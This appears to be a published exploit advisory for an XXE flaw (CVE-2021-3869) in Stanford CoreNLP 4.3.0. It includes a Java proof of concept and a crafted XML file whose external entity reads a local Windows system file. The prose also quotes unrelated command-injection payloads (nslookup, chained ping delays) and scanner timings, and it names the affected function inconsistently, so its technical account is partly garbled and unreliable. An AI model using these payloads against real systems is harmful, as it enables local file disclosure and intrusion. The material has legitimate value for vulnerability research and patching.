# Exploit Title: CoreNLP 4.3.0 - Improper Restriction of XML External Entity Reference
# Discovered Date: 29/09/2021
# Author: Chandra Srikanth Prathi
# Vendor Homepage: https://github.com/stanfordnlp/CoreNLP
# Affected Version: Tested on 4.3.0
# CVE : CVE-2021-3869

*************************************************************************************************************************************

Vulnerability :Improper Restriction of XML External Entity Reference

*************************************************************************************************************************************
The Stanford CoreNLP package provides a set of natural language analysis tools written in Java, is using a vulnerable XML External Entity (XXE). An attacker that is able to provide a crafted XML file as input to the getTextContentFromTagsFromFile() function in the "XMLUtils.java" file may allow an attacker to execute XML External Entities (XXE), including exposing the contents of local files to a remote server. The command output does not appear to be returned in the application's responses, however it is possible to inject time delay commands to verify the existence of the vulnerability. It is also possible to cause the application to interact with an external domain, to verify that a command was executed.  The payload |nslookup -q=cname mytest.com.& was submitted in the parameters. The application performed a DNS lookup for the specified domain name.  Additionally, the payload |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1 was submitted in the parameters. The application took 20960 milliseconds to respond to the request, compared with 1348 milliseconds for the original request.

Affected File: https://github.com/stanfordnlp/CoreNLP/blob/147e45894f007caf7dd5c7f7677bcfcf95a38e94/src/edu/stanford/nlp/util/XMLUtils.java#L73
Affected Function: getTextContentFromTagsFromFileSAXException()
Affected Parameter: f

*************************************************************************************************************************************
POC

*************************************************************************************************************************************
Poc.java:
*************************************************************************************************************************************
import java.io.File;
import java.util.List;
import edu.stanford.nlp.util.XMLUtils; 

public class Poc {
    public static void main(String[] args) {
        File file = new File("C:\\sample.xml");
        List<String> returnLlist = XMLUtils.getTextContentFromTagsFromFile(file, "lastName");
        System.out.print(returnLlist);
    }
}

*************************************************************************************************************************************
Sample.xml:
*************************************************************************************************************************************
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///c:/windows/win.ini"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
